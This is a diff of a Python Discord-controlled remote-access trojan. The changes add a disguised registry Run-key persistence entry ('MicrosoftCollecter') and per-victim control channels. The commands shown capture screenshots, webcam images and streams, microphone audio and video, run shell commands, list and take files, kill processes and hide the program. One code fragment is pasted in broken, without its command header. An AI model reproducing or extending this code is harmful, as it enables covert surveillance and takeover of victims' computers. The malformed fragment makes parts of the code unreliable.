@@ -15,12 +15,13 @@ import numpy as np
 from io import BytesIO
 from time import time
 import ctypes
+from discord.ext.commands import Context
+
 
 intents = discord.Intents.default()
 intents.all()
 intents.guilds = True
 intents.messages = True
-intents.message_content = True
 permissions = discord.Permissions()
 permissions.manage_channels = True
 permissions.manage_messages = True
@@ -30,7 +31,12 @@ permissions.administrator = True
 client = discord.Client(intents=intents)
 
 
-token = "DISCORD BOT TOKEN HERE"
+file_path = os.path.abspath(sys.argv[0])
+register = ["reg", "add", "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Run", "/v", "MicrosoftCollecter", "/t", "REG_SZ", "/d", file_path]
+subprocess.call(['echo', 'y', '|'] + register, shell=True)
+
+
+token = "YOUR_TOKEN_HERE"
 
 temp = os.getenv("temp")
 temp_path = os.path.join(temp, ''.join(random.choices(
@@ -73,30 +79,31 @@ if sys.platform.startswith('win'):
 else:
     pass
 
+with open(f"{temp_path}\\session{random.randint(0,9999999)}.txt", "w+") as userchannel:
+    userchannel.write(str(random.randint(0,99999999)))
+    userchannel.seek(0)
+    channel_name = userchannel.read()
 
 @bot.event
 async def on_ready():
-    channel_name = username
+
     guild = bot.guilds[0] if bot.guilds else None
-    channel_name_lower = channel_name.lower()
 
     if guild:
         all_channels = [channel.name.lower() for channel in guild.channels]
 
-        if channel_name_lower not in all_channels:
-            new_channel = await guild.create_text_channel(channel_name_lower)
+        if channel_name not in all_channels:
+            new_channel = await guild.create_text_channel(channel_name)
 
-        channel = discord.utils.get(guild.channels, name=channel_name_lower)
+        channel = discord.utils.get(guild.channels, name=channel_name)
 
         if channel:
-            await channel.send("""```IM READY FOR DANCE LETS START @everyone!
-                !helpme For Commands!```
-            """)
+            await channel.send("""```@everyone !!! !helpme for commands.```""")
 
 
 @bot.command(name="getinfo")
 async def sendusername(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -120,7 +127,7 @@ async def sendusername(ctx):
 
 @bot.command(name=("ss"))
 async def ss(ctx, numberofphoto: int):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -150,7 +157,7 @@ async def ss(ctx, numberofphoto: int):
 
 @bot.command(name="ws")
 async def webcamshot(ctx, numberofphoto: int):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -186,15 +193,15 @@ async def send_camera_feed():
 
 @bot.command(name="wstream")
 async def stream(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
         return
-    channel_name = username + "-stream"
+    channel_names = channel_name + "-stream"
     try:
         guild = bot.guilds[0] if bot.guilds else None
-        channel_name_lower = channel_name.lower()
+        channel_name_lower = channel_names.lower() + "stream"
 
         if guild:
             all_channels = [channel.name.lower() for channel in guild.channels]
@@ -217,14 +224,14 @@ async def stream(ctx):
 
 @bot.command(name="stopstream")
 async def stop(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
         return
-    channel_name = username + "-stream"
+    channel_names = channel_name + "-stream"
     guild = bot.guilds[0] if bot.guilds else None
-    channel_name_lower = channel_name.lower()
+    channel_name_lower = channel_names.lower() + "stream"
     channel = discord.utils.get(guild.channels, name=channel_name_lower)
     global CHANNEL_ID
     CHANNEL_ID = channel.id
@@ -235,7 +242,7 @@ async def stop(ctx):
 
 @bot.command(name="video")
 async def recordvideo(ctx, seconds: int):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -273,7 +280,7 @@ async def recordvideo(ctx, seconds: int):
 
 @bot.command(name="recordvoice")
 async def recordvoice(ctx, seconds: int):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -303,7 +310,7 @@ async def recordvoice(ctx, seconds: int):
 
 @bot.command(name="command")
 async def command(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -328,26 +335,38 @@ async def command(ctx, *args):
 
 @bot.command(name="gofile")
 async def listfile(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
         return
-    command_string = " ".join(args)
-    os.chdir(command_string)
-    result = subprocess.run(
-        "dir", shell=True, capture_output=True, text=True)
-    chunk_size = 1000
-    chunks = [result.stdout[i:i+chunk_size]
-              for i in range(0, len(result.stdout), chunk_size)]
+    try:
+        command_string = " ".join(args)
+        os.chdir(command_string)
+        result = subprocess.run(
+            "dir", shell=True, capture_output=True, text=True)
+        chunk_size = 1000
+        chunks = [result.stdout[i:i+chunk_size]
+                for i in range(0, len(result.stdout), chunk_size)]
 
-    for i, chunk in enumerate(chunks, start=1):
-        await ctx.channel.send(f"Command Output (Part {i}):\n```\n{chunk}\n```")
+        for i, chunk in enumerate(chunks, start=1):
+            await ctx.channel.send(f"Command Output (Part {i}):\n```\n{chunk}\n```")
+    except Exception as e:
+        await ctx.channel.send(f"{e}")
 
 
-@bot.command(name="kill")
+
+    if ctx.author.voice:
+        channel = ctx.author.voice.channel
+        voice_channel = await channel.connect()
+
+        
+        voice_channel.play(discord.FFmpegPCMAudio(executable="/tam/yol/ffmpeg", source="audio=Microphone"))
+
+    else:
+        await ctx.send("Lütfen bir sesli kanala katılın.")@bot.command(name="kill")
 async def tasklist(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -366,7 +385,7 @@ async def tasklist(ctx, *args):
 
 @bot.command(name="get")
 async def getfile(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -382,7 +401,7 @@ async def getfile(ctx, *args):
 
 @bot.command(name="setlang")
 async def changelang(ctx, lang):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -397,7 +416,7 @@ async def changelang(ctx, lang):
 
 @bot.command(name="say")
 async def say(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -417,7 +436,7 @@ async def say(ctx, *args):
 
 @bot.command(name="msg")
 async def msg(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -437,7 +456,7 @@ async def msg(ctx, *args):
 
 @bot.command(name="amiadmin")
 async def amiadmin(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -456,7 +475,7 @@ async def amiadmin(ctx):
 
 @bot.command(name="hide")
 async def hide(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -473,7 +492,7 @@ async def hide(ctx):
 
 @bot.command(name="shutdown")
 async def shutdown(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -488,7 +507,7 @@ async def shutdown(ctx):
 
 @bot.command(name="restart")
 async def restart(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -503,7 +522,7 @@ async def restart(ctx):
 
 @bot.command(name="voice")
 async def voice(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -527,7 +546,7 @@ async def voice(ctx, *args):
 
 @bot.command(name="wallpaper")
 async def wallpaper(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -559,7 +578,7 @@ async def wallpaper(ctx, *args):
 
 @bot.command(name="website")
 async def website(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -571,7 +590,7 @@ async def website(ctx, *args):
 
 @bot.command(name="upload")
 async def upload(ctx, *args):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -591,7 +610,7 @@ async def upload(ctx, *args):
 
 @bot.command(name="critproc")
 async def critproc(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -607,7 +626,7 @@ async def critproc(ctx):
 
 @bot.command(name="helpme")
 async def helpmsg(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
@@ -659,7 +678,7 @@ DO NOT FORGET TO GIVE SECONDS OR NUMBERS!
 
 @bot.command(name="cmd")
 async def cmd(ctx):
-    allowed_channel = username.lower()
+    allowed_channel = channel_name
 
     if ctx.channel.name.lower() != allowed_channel:
 
